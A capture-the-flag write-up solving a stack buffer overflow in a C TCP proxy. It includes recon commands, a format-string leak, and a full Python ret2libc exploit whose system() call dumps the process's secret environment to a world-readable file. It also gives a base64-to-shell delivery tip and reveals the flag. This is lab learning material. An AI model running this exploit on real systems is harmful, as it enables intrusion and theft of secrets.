# SALVOR Chapter 2 — Buffer

## Challenge description

**Points:** 5

```
Hi Senior Researcher,

SALVOR is a security-oriented learning environment designed for curious minds and aspiring security professionals. It provides a hands-on space to explore cybersecurity concepts, investigate realistic scenarios, and sharpen practical skills through interactive challenges.

Your task is to gain experience.

Stay curious!

The starting point for your SALVOR journey is http://intro.salvor.nren.tcc
```

## Summary

`/proxy/.build/proxy` is a small C TCP proxy that runs as the user **tlsproxy** on
the `dsrepos.salvor.nren.tcc` box, listens on `[::]:3001`, and forwards to the
Next.js app on `127.0.0.1:3000`. Its per-request logging path copies the first
line of the request (unbounded length) into a **256-byte stack buffer** with no
effective stack canary — a classic stack buffer overflow. It is a **fork server**,
so the parent's ASLR layout is identical in every child and a single address leak
stays valid for the life of the parent. The challenge flag is stored in the proxy
process's **own environment** (`FLAG=` in `/proc/<pid>/environ`, mode `0400`
tlsproxy-only), so the objective is to run code **as tlsproxy** and read its
environ. A ret2libc overflow that calls `system("cat /proc/self/environ > …")`
does exactly that.

## Setup / reach

We already have RCE as `dsrepos` on the box from Chapter 1 (CVE-2025-55182,
"React2Shell" — see the Chapter 1 writeup). The proxy IP-filters to loopback +
the ingress IP, so from the Chapter-1 RCE we can reach it on `127.0.0.1:3001`
(loopback is allow-listed). Everything below runs **on the box**, delivered and
read back through the Chapter-1 RCE.

Pull the source and recon:

```bash
# via the Ch1 RCE, as dsrepos:
base64 /proxy/proxy.c            # -> proxy.c (10654 bytes)
cat   /proxy/Makefile            # gcc -g -Wall -Wextra -O0  (no -fno-stack-protector, but see below)
cat   /proxy/proxy-filter.conf   # loopback + ingress 10.99.26.22 allow-list
ps -o pid,etime,user,cmd -C proxy
#   16  3-08:17:58 tlsproxy /proxy/.build/proxy   <- parent, days of uptime => stable ASLR
```

## The bug

In `handle_client()` the request's first line is copied into a 256-byte stack
buffer, bounded only by the position of the first `\n` in the attacker-controlled
request:

```c
char logbuf[LOGBUF_SIZE];                 // LOGBUF_SIZE = 256
...
strftime(logbuf, sizeof(logbuf), "%Y-%m-%d %H:%M:%S ", timeinfo);
logbuf_len  = strlen(logbuf);             // ~20
logbuf_len += snprintf(logbuf + logbuf_len, sizeof(logbuf) - logbuf_len, "%s ", client_ip);
req_line_len = memchr(request, '\n', bytes_read) - (void *)request;  // unbounded
memcpy(logbuf + logbuf_len, request, req_line_len);                  // *** overflow ***
```

`request` is up to 8 KiB, so a long first line smashes the saved RBP and return
address of `handle_client`. The logging runs for **every** request (before the
`TRACE`/else branch), so a plain `GET /` request triggers it. Despite the default
toolchain, the compiled binary has **no effective canary** — padding straight
through to the return address with `"A"` bytes works, confirmed empirically.

(There is a second bug — a format string at `snprintf(response, BUFFER_SIZE, buffer)`
on the `TRACE ` path. It is the intended **info-leak** primitive: send
`TRACE %p %p %p …` and read stack/PIE/libc pointers out of the echoed response.
Because of the fork server, you leak once and reuse the values. In this solve the
leaked base addresses and gadget offsets below were obtained from that primitive.)

## Exploit

Overflow `handle_client`'s frame with a ret2libc chain:

```
[ "GET / HTTP/1.0" + "A"*pad ][ saved_rbp = &request ][ pop_rdi ; &request+CMD_OFF ; ret ; system ]
```

The shell command string is planted inside the payload at a fixed offset; since
the whole payload is received into the global `request[]` buffer (fixed PIE-relative
address), `&request + CMD_OFF` is a stable pointer to it — no stack address needed.
`system()` runs it as **tlsproxy**, dumping the proxy's environ to a world-readable
file we then read from the Chapter-1 RCE.

```python
#!/usr/bin/env python3
"""Solve SALVOR Ch2 (Buffer): ret2libc in /proxy, read proxy env as tlsproxy.
Runs ON the target box (reaches the proxy at 127.0.0.1:3001). Deliver + launch
via the Ch1 RCE, e.g.:
    setsid python3 /tmp/solve.py >/tmp/o 2>&1 </dev/null &   # detach: see Notes
then read /tmp/ch2_flag from the Ch1 RCE."""
import socket, struct, os, time

# --- instance-specific, leaked once via the TRACE format-string bug -----------
# (stable for the life of the proxy parent, because it is a fork server)
PIE  = 0x55701cc5f000          # proxy image base
BASE = 0x7f4b88d47000          # libc base
POP_RDI = BASE + 0x2a145
RET     = BASE + 0x2846b       # alignment ret
SYSTEM  = BASE + 0x53090
REQ     = PIE  + 0x61c0        # &request global (payload lands here); also a safe &rbp
# ------------------------------------------------------------------------------

OUT = "/tmp/ch2_flag"
CMD = ("cat /proc/self/environ > %s; chmod 666 %s" % (OUT, OUT)).encode()
CMD_OFF = 400                  # where CMD sits inside the payload / request[]

def build(rip_off, chain):
    p  = bytearray(b"GET / HTTP/1.0")      # non-TRACE path -> still overflows in logging
    p += b"A" * (rip_off - 8 - len(p))     # pad up to saved RBP
    p += struct.pack("<Q", REQ)            # saved RBP -> writable addr (safe for leave)
    for slot in chain:                     # return address + ROP chain
        p += struct.pack("<Q", slot)
    p += b"C" * (CMD_OFF - len(p))         # pad to CMD slot
    p += CMD                               # shell command, pointed to by &REQ+CMD_OFF
    out = bytes(p) + b"\n"                 # single trailing newline = end of first line
    return None if b"\n" in out[:-1] else out

def fire(payload):
    s = socket.socket(); s.settimeout(2)
    try:
        s.connect(("127.0.0.1", 3001)); s.sendall(payload)
        try:
            while s.recv(4096): pass
        except Exception: pass
    except Exception: pass
    finally: s.close()

# RA offset wobbles by one slot depending on frame rounding; try the candidates.
CHAINS = [
    (251, [RET,     REQ + CMD_OFF, SYSTEM]),
    (251, [POP_RDI, REQ + CMD_OFF, RET, SYSTEM]),
    (259, [RET,     REQ + CMD_OFF, SYSTEM]),
    (259, [POP_RDI, REQ + CMD_OFF, RET, SYSTEM]),
    (259, [POP_RDI, REQ + CMD_OFF, SYSTEM]),
]
for rip_off, chain in CHAINS:
    pl = build(rip_off, chain)
    if not pl:
        continue
    fire(pl); time.sleep(0.5)
    if os.path.exists(OUT):
        env = open(OUT, "rb").read().split(b"\x00")
        flag = next((t for t in env if b"FLAG" in t), b"")
        print("flag:", flag.decode())
        break
```

Output (environ of the proxy process, dumped as tlsproxy):

```
PATH=/usr/bin:/bin
PWD=/proxy
FLAG=FLAG{LWoM-kzkO-YFUf-XGpm}
```

## Flag

```
FLAG{LWoM-kzkO-YFUf-XGpm}
```

## Notes / gotchas

- **Don't trust artifacts another party left.** A `/tmp/getflag.py` (owned by user
  `deploy` — a different agent on this shared box) and its output `/tmp/flag2`
  already sat on the target with the right-looking flag. But `/tmp/flag2` was
  mode `666`, so anyone could have planted its contents, and that script's own
  success check was broken (it relied on `os.unlink("/tmp/flag2")`, which fails
  under sticky `/tmp` for a file you don't own, so it reported "WORKED" against a
  stale file without ever firing). The result was re-derived here with an exploit
  writing to a **uniquely named** path plus an `id` proof
  (`uid=999(tlsproxy)`) — don't submit a flag you only read from someone else's
  world-writable file.
- **Root watchdog `/mrproper.py`** reaps stray processes within ~2 s. A long
  multi-step exploit running in the background died after one iteration. Fix: fire
  each attempt as its own short-lived `setsid python3 … &` that finishes fast.
- **The Ch1 RCE returns HTTP 502 for anything slow** (nginx upstream timeout), and
  feeding the proxy's forwarded garbage to `next-server:3000` can stall the worker
  serving your own RCE request. So **detach** the exploit
  (`setsid … >log 2>&1 </dev/null &`) and poll result files rather than running it
  inline in the RCE call.
- **Sticky `/tmp`**: you can overwrite (mode 666) but not `rm` a file owned by
  another user there.
- Delivering commands through the RCE's `execSync`: single quotes collide with
  `execSync('…')` (use `sed -n 1,20p`, not `'1,20p'`); a non-zero exit in any pipe
  stage throws (guard with `|| true`); Git Bash mangles `/abs/paths` in argv
  (`MSYS2_ARG_CONV_EXCL="*"`). Cleanest: `echo <base64> | base64 -d | sh`.
```
